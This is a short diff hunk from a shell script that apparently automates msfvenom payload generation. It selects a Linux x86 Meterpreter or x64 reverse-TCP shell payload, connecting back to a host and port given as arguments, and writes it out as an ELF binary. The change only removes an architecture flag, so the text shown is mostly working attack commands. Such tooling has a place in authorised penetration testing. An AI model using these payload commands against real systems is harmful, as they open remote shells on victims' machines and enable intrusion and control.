@@ -25,10 +25,10 @@ then
 	if [ $4 -eq 1 ]
 	then
 		# Linux (x86)
-		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > reverse.elf
+		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > reverse.elf
 	else
 		# Linux (x64)
-		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > shell.elf
+		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > shell.elf
 	fi
 elif [ $3 -eq 3 ]
 then
